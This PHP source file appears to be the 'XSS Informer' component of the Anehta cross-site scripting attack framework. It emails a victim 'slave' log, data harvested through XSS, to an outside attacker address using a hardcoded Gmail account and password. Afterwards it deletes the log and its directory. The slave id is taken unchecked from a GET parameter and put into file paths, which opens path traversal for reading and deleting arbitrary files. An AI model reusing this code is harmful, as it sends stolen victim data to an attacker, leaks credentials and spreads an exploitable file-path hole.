<?php

error_reporting(E_ALL);
//error_reporting(E_STRICT);

//date_default_timezone_set('America/Toronto');
date_default_timezone_set(date_default_timezone_get());

include_once('../tools/phpMailer/class.phpmailer.php');
//include("class.smtp.php"); // optional, gets called from within class.phpmailer.php if not already loaded

//$mail->SetLanguage("en", "../tools/phpMailer/language/");


$mail             = new PHPMailer();

//$body             = $mail->getFile('../slave/Slave_1224341218390/log.txt');
//$body             = iconv('gb2312', 'utf-8',$body); 
//$body             = eregi_replace("[\]",'',$body);

$mail->IsSMTP();
$mail->SMTPAuth   = true;                  // enable SMTP authentication
$mail->SMTPSecure = "ssl";                 // sets the prefix to the servier
$mail->Host       = "smtp.gmail.com";      // sets GMAIL as the SMTP server
$mail->Port       = 465;                   // set the SMTP port for the GMAIL server

// 测试帐户,别捣乱啊!
$mail->Username   = "anehtatest@gmail.com";  // GMAIL username
$mail->Password   = "anehta111111";            // GMAIL password

//$mail->AddReplyTo("yourusername@gmail.com","First Last");

$mail->From       = "anehtatest@gmail.com";
$mail->FromName   = "Anehta";

// 获取水印
if (!empty($_GET["delslavelog"])){
  $slaveid = $_GET["delslavelog"];
}

$mail->Subject    = "[Anehta]XSS Informer - ".$slaveid." - !";

$mail->Body       = "Master, This is the Slave Infomation!";                      //HTML Body
//$mail->AltBody    = "To view the message, please use an HTML compatible email viewer!"; // optional, comment out and test
//$mail->WordWrap   = 50; // set word wrap

//$mail->Body       = $body; // 发送纯文本邮件
//$mail->MsgHTML($body);

$mail->AddAddress("axis@ph4nt0m.org", "Anehta Master");



$mail->AddAttachment("../slave/$slaveid/log.txt");     // attachment 日志作为附件发送


$mail->IsHTML(false); // true send as HTML; false to send text mail

if(!$mail->Send()) {
  echo "Mailer Error: " . $mail->ErrorInfo;
} else {
  echo "Message sent!";
  
  sleep(2);
  // 删除log文件
  unlink("../slave/$slaveid/log.txt");
  
  //删除目录
  sleep(1);
  rmdir("../slave/$slaveid");
}


?>
